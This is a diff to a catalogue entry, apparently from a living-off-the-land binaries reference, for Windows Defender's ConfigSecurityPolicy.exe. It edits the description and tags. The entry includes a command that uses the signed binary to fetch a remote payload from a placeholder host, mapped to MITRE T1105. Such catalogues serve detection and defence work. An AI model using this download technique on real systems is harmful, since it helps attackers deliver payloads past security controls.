@@ -12,12 +12,14 @@ Commands:
     MitreID: T1567
     OperatingSystem: Windows 10
   - Command: ConfigSecurityPolicy.exe https://example.com/payload
-    Description: It will download a remote payload and place it in the cache folder (for example - %LOCALAPPDATA%\Microsoft\Windows\INetCache\IE)
+    Description: It will download a remote payload and place it in INetCache.
     Usecase: Downloads payload from remote server
     Category: Download
     Privileges: User
     MitreID: T1105
     OperatingSystem: Windows 10, Windows 11
+    Tags:
+      - Download: INetCache
 Full_Path:
   - Path: C:\Program Files\Windows Defender\ConfigSecurityPolicy.exe
   - Path: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\ConfigSecurityPolicy.exe
